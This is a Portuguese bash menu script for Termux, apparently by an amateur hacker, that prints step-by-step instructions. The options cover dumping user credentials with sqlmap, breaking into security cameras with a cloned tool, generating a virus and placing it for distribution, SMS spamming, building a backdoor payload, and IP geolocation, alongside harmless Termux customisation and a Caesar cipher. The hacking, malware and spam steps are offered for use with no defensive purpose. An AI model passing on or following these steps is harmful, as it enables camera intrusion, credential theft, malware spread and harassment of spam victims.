#!/bin/bash
COR_CINZA="\033[1;30m"
COR_VERMELHO="\033[0;31m"
COR_VERMELHO_CLARO="\033[1;31m"
COR_AZUL_ESCURO="\033[0;34m"
COR_AZUL_MARINHO="\033[1;34m"
COR_AMARELO="\033[1;33m"
COR_VERDE='\033[1;32m'
clear
  printf $COR_AZUL_ESCURO
  figlet -f mono12 "Como instalar e  usar algumas ferramentas do termux"
   printf $COR_VERDE
   echo "Created by:Z3R0_AN7RAX"
    printf $COR_AMARELO
   echo "Como instalar e  usar algumas ferramentas"
    printf $COR_VERMELHO
     echo "GitHub:https://github.com/js13-Hacker"
    printf $COR_AZUL_MARINHO
     echo "Quer aprender o que primeiro?[1]Como usar o Sqlmap"
      printf $COR_AZUL_MARINHO
      echo "[2]Como invadir câmera de segurança"
       printf $COR_VERMELHO_CLARO
        echo "[3]Como criar vírus"
        printf $COR_CINZA
        echo "[4]Como fazer spam de sms"
         printf $COR_AZUL_ESCURO
         echo "[5]Como criar payload"
           printf $COR_AMARELO
          echo "[6]Como  pegar a localização pelo ip"
           printf $COR_VERDE
           echo "[7]Como personalizar o termux"
            printf $COR_VERMELHO
            echo "[8]Como criptografar utilizando a cifra de cezar"


      read aprender
      if [ "$aprender" = "1" ]
       then
printf $COR_AMARELO
echo "Você escolheu o número 1"
 echo " [1] ATUALIZE SEU REPOSITÓRIO:apt-get update"
  echo " [2] INSTALE OS SEGUINTES PACOTES:apt-get install python;apt-get install python2;apt-get install git"
   echo " [3] BAIXE O SCRIPT:git clone https://github.com/sqlmapproject/sqlmap"
    echo " [4] ESCOLHA O DIRETÓRIO DO SQL:cd sqlmap"
     echo " [5] COMANDO DE EXECUÇÃO PARA ABRIR O SQLMAP:python2 sqlmap.py"
      echo " [6] EFETUAR A INVASÃO EX: python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs"
       echo " [7]python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables"
        echo " [8]python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns"
         echo " [9]python2 sqlmap.py -u http://testphp.vulnweb.com/listproducts.php? -D acuart -T users -C name,pass,uname,email --dump"
          printf $COR_VERDE
           echo " [•]O que você viu acima foi só um exemplo[•]"

fi

if [ "$aprender" = "2" ]
then
printf $COR_AZUL_MARINHO
echo "Você escolheu o número 2"
 echo " [1]apt-get install python3"
  echo " [2]apt-get install git"
   echo " [3]git clone:https://github.com/AngelSecurityTeam/Cam-Hackers"
    echo " [4]cd Cam-Hackers"
     echo " [5]ls"
      echo " [6]chmod +x cam-hackers.py"
       echo " [7]python3 cam-hackers.py"
fi

if [ "$aprender" = "3" ]
then
printf $COR_VERMELHO_CLARO
echo "Você escolheu o número 3"
 echo " [1]pkg install python2"
  echo " [2]pkg install git"
   echo " [3]git clone:https://github.com/TheReaper167/Malicious"
    echo " [4]cd Malicious"
     echo " [5]ls"
      echo " [6]pip2 install -r requirements.txt"
       echo " [7]python2 malicious.py"
        echo " [8]escolha a plataforma"
         echo " [9]escolha o vírus"
          echo " [10]cd Android"
           echo " [11]mv (nome do vírus) /sdcard/(pasta desejada para mandar o vírus)"
fi

if [ "$aprender" = "4" ]
then
printf $COR_CINZA
 echo "Você escolheu o número 4"
  echo " [1]apt update && apt upgrade"
   echo " [2] install git -y"
    echo " [3]git clone:https://github.com/KiritoOfficial/spamrito"
     echo " [4]cd spamrito"
      echo " [5]chmod +x *"
       echo " [6]bash install.sh"
        echo " [7]node spam.js"

fi

if [ "$aprender" = "5" ]
then
printf $COR_AZUL_ESCURO
 echo "Você escolheu o número 5"
  echo " [1]pkg install python"
   echo " [2]pkg install wget"
    echo " [3]pkg install python2"
     echo " [4]git clone:https://github.com/shoowl/Backdoortst"
      echo " [5]cd Backdoortst"
       echo " [6]bash install.sh"
        echo " [7]bash backdoortst.sh"

fi

if [ "$aprender" = "6" ]
then
printf $COR_AMARELO
 echo "Você escolheu o número 6"
  echo " [1]apt update && apt upgrade -y"
   echo " [2]pkg install git -y"
    echo " [3]git clone:https://github.com/xXh4x0RXx/C4NET"
     echo " [4]cd C4NET"
      echo " [5]bash install.sh"
       echo " [6]cd script"
        echo " [7]python3 client.py"

fi

if [ "$aprender" = "7" ]
then
printf $COR_VERDE
 echo "Você escolheu o número 7"
  echo " [1]apt update && apt upgrade -y"
   echo " [2]pkg install git -y"
    echo " [3]git clone:https://github.com/xXh4x0RXx/ouija"
     echo " [4]cd ouija"
      echo " [5]bash install.sh"

fi



if [ "$aprender" = "8" ]
then
printf $COR_VERMELHO
 echo "Você escolheu o número 8"
  echo " [1]apt update && apt upgrade -y"
   echo " [2]pkg install git -y"
    echo " [3]git clone:https://github.com/xXh4x0RXx/4cRypt"
     echo " [4]cd 4cRypt"
      echo " [5]cd script"
       echo " [6]gcc -o crypt crypt.c"
        echo " [7]./crypt"

fi


